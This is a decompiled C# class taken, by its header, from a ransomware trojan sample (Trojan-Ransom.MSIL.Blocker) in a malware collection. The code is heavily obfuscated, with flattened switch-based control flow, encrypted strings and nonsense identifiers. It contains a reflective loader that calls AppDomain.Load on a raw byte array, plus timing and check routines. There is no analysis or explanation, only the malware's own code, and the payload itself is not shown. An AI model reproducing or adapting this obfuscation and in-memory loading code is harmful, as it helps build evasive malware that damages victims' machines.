// Decompiled with JetBrains decompiler
// Type: s7J.k8F
// Assembly: y2KB, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3A6517FF-F8AF-40F3-AD9D-058B976B3962
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-75f615f27b23cc56767ed8b3e684d69b27376165432116913f30cbc12c439fb2.exe

using a8S6;
using a9X0;
using Bo4;
using c3W;
using d5F;
using j5X;
using Microsoft.VisualBasic;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading.Tasks;
using System.Windows.Forms;
using w0K3;

namespace s7J
{
  public class k8F
  {
    private string _TrainID;
    private s7F.b6K i;

    public string TrainID
    {
      get => this._TrainID;
      set => this._TrainID = value;
    }

    public Pq7 tType
    {
      get => this.i.k;
      set => this.i.k = value;
    }

    public m4G tDAO => this.i.f;

    public k8F() => this.i.f = (object) new m4G() as m4G;

    public k8F(string id)
    {
      this.i.f = (object) new m4G() as m4G;
      this.tType = new Pq7();
      this.TrainID = id;
    }

    public void Ez7(string Rn5) => this.tDAO.Kt8(Rn5);

    public void Hr4()
    {
      m4G tDao = this.tDAO;
      k8F k8F = this;
      ref k8F local = ref k8F;
      tDao.s5A(ref local);
    }

    public int z7T() => this.tDAO.Yo8(this);

    public int j8A() => this.tDAO.Pk2(this);

    public int Ma9() => this.tDAO.d2N(this);

    internal static bool y7H()
    {
      int num1 = 8;
      object obj1;
      int num2;
      object obj2;
      int index;
      bool flag1;
      bool flag2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            r3MF.s8MT<Task>(k4YJ.Pz91(30000, (short) 747, 738), 847, '͐');
            goto case 9;
          case 1:
            num1 = index < (obj2 as string[]).Length ? 13 : 5;
            continue;
          case 2:
            num2 = 0;
            num1 = 20;
            continue;
          case 3:
            num1 = num2 != 2 ? 7 : 10;
            continue;
          case 4:
            goto label_21;
          case 5:
            num1 = 20;
            continue;
          case 6:
            num1 = num2 <= 0 ? 0 : 12;
            continue;
          case 7:
            flag2 = false;
            num1 = 4;
            continue;
          case 9:
            num1 = 11;
            continue;
          case 10:
            flag2 = true;
            num1 = 4;
            continue;
          case 11:
            num1 = 16;
            continue;
          case 12:
            checked { --num2; }
            num1 = 0;
            continue;
          case 13:
            flag1 = !Pq7.z9L((obj2 as string[])[index]);
            goto case 17;
          case 14:
            obj2 = (object) (string[]) obj1;
            index = 0;
            num1 = 1;
            continue;
          case 15:
          case 16:
            checked { ++index; }
            num1 = 1;
            continue;
          case 17:
            num1 = 19;
            continue;
          case 18:
            checked { ++num2; }
            num1 = 16;
            continue;
          case 19:
            num1 = !flag1 ? 18 : 6;
            continue;
          case 20:
            num1 = num2 != 2 ? 14 : 3;
            continue;
          default:
            obj1 = (object) new string[2]
            {
              Bj91.g8RX((byte) 30, 898835384, 2, 'Q'),
              Bj91.g8RX((byte) 28, 898835404, 8, '_')
            };
            num1 = 2;
            continue;
        }
      }
label_21:
      return flag2;
    }

    [SecuritySafeCritical]
    internal static void s3B<Bq5, Fw4, Gz4, Yi9, Dz2>(
      [In] Yi9 obj0,
      [In] Gz4 obj1,
      [In] Fw4 obj2,
      [In] Bq5 obj3,
      [In] Dz2 obj4,
      [In] short obj5,
      [In] int obj6)
      where Bq5 : object
      where Fw4 : string
      where Gz4 : object
      where Yi9 : Collection
      where Dz2 : object
    {
      int num1 = 4;
      int num2;
      int num3;
      int num4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 753 < num3 / 2 - num4 ? 8 : 7;
            continue;
          case 2:
            obj0.Add((object) obj1, (string) obj2, (object) obj3, (object) obj4);
            goto case 5;
          case 3:
            goto label_12;
          case 5:
            ++num2;
            num3 = 1506;
            num4 = 272;
            goto case 0;
          case 6:
            num1 = 5;
            continue;
          case 7:
            goto label_11;
          case 8:
            int num5;
            switch ((obj6 ^ (int) obj5) - 98 ^ num2)
            {
              case 0:
                num5 = 2;
                break;
              default:
                num5 = 6;
                break;
            }
            num1 = num5;
            continue;
          default:
            num2 = 0;
            num1 = 8;
            continue;
        }
      }
label_12:
      return;
label_11:
      Gr0.t[147] = (byte) ((int) Gr0.t[147] * obj6 & 231);
    }

    [SecuritySafeCritical]
    internal static string Lb7<j1E, c3K>([In] c3K obj0, [In] j1E obj1, [In] char obj2, [In] short obj3)
      where j1E : string
      where c3K : string
    {
label_3:
      int num1 = 0;
      int num2 = 9;
      IEquatable<string> equatable;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
            ++num1;
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? 10 : 11;
            continue;
          case 3:
            num2 = 9;
            continue;
          case 4:
            equatable = (IEquatable<string>) null;
            num2 = 1;
            continue;
          case 5:
          case 6:
            equatable = (IEquatable<string>) ((string) obj0 + (string) obj1);
            num2 = 1;
            continue;
          case 8:
            goto label_3;
          case 9:
            int num4 = (int) obj3 ^ (int) obj2;
            Gr0.t[31] = (byte) ((int) Gr0.t[31] * (int) obj3 & 46);
            int num5;
            switch (num4 - 75 ^ num1)
            {
              case 0:
                num5 = 6;
                break;
              default:
                num5 = 4;
                break;
            }
            num2 = num5;
            continue;
          case 10:
            goto label_12;
          case 11:
            num2 = 9;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (k8F.Lb7);
            num2 = 8;
            continue;
        }
      }
label_12:
      return (string) equatable;
    }

    [SecuritySafeCritical]
    internal static AppDomain r4Q([In] int obj0, [In] int obj1)
    {
label_3:
      int num1 = 0;
      int num2 = 4;
      MarshalByRefObject marshalByRefObject;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num3 = 237;
            goto case 9;
          case 1:
            ++num1;
            goto case 0;
          case 2:
            num4 = num3 + num4;
            num2 = num4 % 2 != 0 ? 4 : 3;
            continue;
          case 3:
            goto label_15;
          case 4:
            int num5;
            switch ((obj0 ^ obj1) - 100 ^ num1)
            {
              case 0:
                num5 = 10;
                break;
              default:
                num5 = 8;
                break;
            }
            num2 = num5;
            continue;
          case 6:
            goto label_3;
          case 7:
            num2 = 4;
            continue;
          case 8:
            marshalByRefObject = (MarshalByRefObject) null;
            goto case 11;
          case 9:
            int num6 = num3;
            num4 = num6 * num6;
            num2 = 2;
            continue;
          case 10:
            marshalByRefObject = (MarshalByRefObject) AppDomain.CurrentDomain;
            num2 = 1;
            continue;
          case 11:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (k8F.r4Q);
            num2 = 6;
            continue;
        }
      }
label_15:
      return (AppDomain) marshalByRefObject;
    }

    [SecuritySafeCritical]
    internal static Assembly Jo1<Eb3>([In] Eb3 obj0, [In] byte[] obj1, [In] short obj2, [In] char obj3) where Eb3 : AppDomain
    {
label_3:
      int num1 = 0;
      int num2 = 8;
      _Assembly assembly;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_11;
          case 2:
          case 5:
            ++num1;
            num2 = 357 < 714 / 2 - 309 ? 8 : 1;
            continue;
          case 3:
          case 6:
            goto label_3;
          case 4:
            num2 = 8;
            continue;
          case 7:
          case 9:
            assembly = (_Assembly) obj0.Load(obj1);
            num2 = 2;
            continue;
          case 8:
            int num3;
            switch (((int) obj2 ^ (int) obj3) - 41 ^ num1)
            {
              case 0:
                num3 = 9;
                break;
              default:
                num3 = 10;
                break;
            }
            num2 = num3;
            continue;
          case 10:
            assembly = (_Assembly) null;
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (k8F.Jo1);
            num2 = 3;
            continue;
        }
      }
label_11:
      return assembly as Assembly;
    }

    [SecuritySafeCritical]
    internal static void k6F<Gx9>([In] Gx9 obj0, [In] PictureBoxSizeMode obj1, [In] int obj2, [In] int obj3) where Gx9 : PictureBox
    {
      int num1 = 4;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            obj0.SizeMode = obj1;
            goto case 5;
          case 2:
          case 3:
            num1 = 5;
            continue;
          case 5:
            ++num2;
            num3 = 2781;
            goto case 6;
          case 6:
            int num4 = 707;
            int num5 = num3 / 3;
            int num6 = num4;
            Gr0.t[97] = (byte) (((int) Gr0.t[97] | obj3) & 25);
            num1 = 927 < num5 - num6 ? 8 : 7;
            continue;
          case 7:
            goto label_11;
          case 8:
            int num7;
            switch ((obj2 ^ obj3) - 34 ^ num2)
            {
              case 0:
                num7 = 0;
                break;
              default:
                num7 = 2;
                break;
            }
            num1 = num7;
            continue;
          default:
            num2 = 0;
            num1 = 8;
            continue;
        }
      }
label_11:;
    }
  }
}
